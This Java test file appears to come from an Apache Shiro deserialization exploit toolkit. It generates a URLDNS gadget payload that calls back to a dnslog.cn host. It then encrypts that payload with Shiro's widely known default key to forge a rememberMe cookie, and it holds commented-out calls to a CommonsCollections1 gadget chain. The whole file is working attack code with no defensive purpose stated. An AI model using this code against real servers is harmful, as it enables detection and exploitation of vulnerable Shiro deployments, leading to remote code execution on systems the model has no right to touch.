package shiro.encrypt;

import com.mchange.v2.ser.SerializableUtils;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.subject.SimplePrincipalCollection;
import shiro.gadgets.commons.Serializer1;
import shiro.gadgets.payload.CommonsCollections1;
import shiro.gadgets.payload.KeyFlag;
import shiro.gadgets.payload.Urldns;
import utils.ToByteArray;

import java.util.HashMap;

public class test {

    public static Object getObject() {
        return new SimplePrincipalCollection();
    }
    public static void main(String[] args) throws Exception {

//        Class cl =Class.forName("org.apache.commons.collections.Transformer");
//        ClassLoader.getSystemClassLoader().loadClass("[Lorg.apache.commons.collections.Transformer");

        Urldns.urldns("src/main/resources/url.ser","http://qch5hx.dnslog.cn");

        KeyFlag.keyflag();
////
//        CommonsCollections1.commonscollections1();
        byte[] bytes= ToByteArray.toByteArray("src/main/resources/url.ser");

//
//
//        Serializer1.UnSerializer("src/main/resources/url.ser");

//        byte[] bytes1= SerializableUtils.toByteArray("kPH+bIxk5D2deZiIxcaaaA==");
//        System.out.printf(bytes1.toString());
////

//        Object object=getObject();

        byte[] serpayload = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");


        System.out.printf(Encrypt.encrypt(bytes,serpayload));



    }
}
